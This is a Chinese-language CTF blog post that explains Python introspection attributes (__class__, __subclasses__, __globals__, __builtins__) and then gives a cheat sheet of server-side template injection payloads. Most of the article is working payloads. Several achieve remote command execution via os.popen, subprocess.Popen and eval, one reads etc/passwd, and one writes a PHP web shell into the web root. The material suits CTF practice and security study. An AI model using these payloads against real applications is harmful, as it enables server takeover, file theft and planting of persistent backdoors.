
<!DOCTYPE html>
<html lang="zh_CN">
<head>
    <meta charset="utf-8" />
    <title>Python的各种各样 | Tremseの部屋</title>
    <meta name="author" content="Tremse" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/avatar.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>TREMSEの部屋</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;TREMSEの部屋</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>Python的各种各样</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/11/27
        </span>
        
        <span class="category">
            <a href="/categories/CTF/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                CTF
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            
            <span class="tag">
                
                <a href="/tags/Web/" style="color: #03a9f4">
                    Web
                </a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/Py/" style="color: #00a596">
                    Py
                </a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        
        <h3 id="内置属性模块等"><a href="#内置属性-模块等" class="headerlink" title="内置属性,模块等"></a>内置属性,模块等</h3><ul>
<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__base__</span>:类对象的属性,返回当前类的<font color="#ff9f9f"><strong>直接父类字符串</strong></font>。可以用来获取Object类。</li>
<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__bases__</span>:类对象的属性,返回当前类的<font color="#ff9f9f"><strong>直接父类元组</strong></font>。可以用来获取Object类。</li>
<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__mro__</span>:类对象的属性，返回一个元组，存有类的“方法解析顺序”，可以简单的理解成这个类构造的链（类比js原型链）。可以用来获取Object类。</li>
<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__subclasses__()</span>:类对象的属性,返回当前类的所有<font color="#ff9f9f"><strong>直接子类</strong></font>列表。可以用来获取可利用的类。</li>
<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__class__</span>:各种对象的属性,返回它的所属类。可以用来连接到类对象，方便后续操作。</li>
<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__init__</span>:类对象都有的函数（初始化函数）。可以用来间接获取__globals__。</li>
<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__globals__</span>:函数的属性，返回当前函数所处空间下可使用的module、方法以及所有变量。可以用来获取可利用的类。</li>
<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__dict__</span>:类对象或类实例的属性,查看对象内部所有属性名和属性值组成的字典。可以用来获取可利用的类。</li>
<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__builtins__</span>:内建模块，用于定义内建命名空间，使得我们可以使用内建命名空间中定义的函数。可以利用这个模块导入一些模块到内建命名空间中加以利用(如os)</li>
<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__import__</span>:魔术方法，用于导入模块，常配合<span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__builtins__</span>导入os模块</li>
</ul>
<h3 id="常用类以py-ssti为例"><a href="#常用类-以py-ssti为例" class="headerlink" title="常用类(以py-ssti为例)"></a>常用类(以py-ssti为例)</h3><ul>
<li>利用warnings.catch_warnings配合__builtins__得到eval函数借此进行rce</li>
</ul>
<pre><code class="python"># 注意__subclasss__的元素索引需要根据实际修改
&#123;&#123;[].__class__.__base__.__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']('os').popen('ls /').read()&#125;&#125; 
</code></pre>
<ul>
<li>利用os._wrap_close类所属空间下可用的popen函数进行RCE</li>
</ul>
<pre><code class="python">&#123;&#123;"".__class__.__base__.__subclasses__()[128].__init__.__globals__.popen('whoami').read()&#125;&#125;
&#123;&#123;"".__class__.__base__.__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;
</code></pre>
<ul>
<li>利用subprocess.Popen类进行RCE的payload</li>
</ul>
<pre><code class="python">&#123;&#123;''.__class__.__base__.__subclasses__()[479]('whoami',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;
</code></pre>
<ul>
<li>利用__import__导入os模块进行利用</li>
</ul>
<pre><code class="python">&#123;&#123;"".__class__.__bases__.__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()&#125;&#125;
</code></pre>
<ul>
<li>利用linecache类所属空间下可用的os模块进行RCE的payload</li>
</ul>
<pre><code class="python">&#123;&#123;"".__class__.__bases__.__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()&#125;&#125;
</code></pre>
<ul>
<li>利用file类（仅python2可用）进行文件读入</li>
</ul>
<pre><code class="python">&#123;&#123;[].__class__.__base__.__subclasses__()[40]('etc/passwd').read()&#125;&#125;
</code></pre>
<ul>
<li>通用getshell，都是通过__builtins__调用eval进行代码执行</li>
</ul>
<pre><code class="python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()&#125;&#125; &#123;% endif %&#125;&#123;% endfor %&#125;
</code></pre>
<ul>
<li>读写文件，通过__builtins__调用open进行文件读写</li>
</ul>
<pre><code class="python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('var/www/html/a.php', 'r').write("<?php @system($_GET['x'])?>") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
</code></pre>
<blockquote>
<p>参考 &#x1F970;:<br>    - <a target="_blank" rel="noopener" href="https://www.cnblogs.com/tuzkizki/p/15394415.html">Python SSTI漏洞学习总结 </a></p>
</blockquote>

    </div>
    
    
    
    
    
    
    

</div>
            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 Tremseの部屋
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;Tremse
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    




    
</body>
</html>
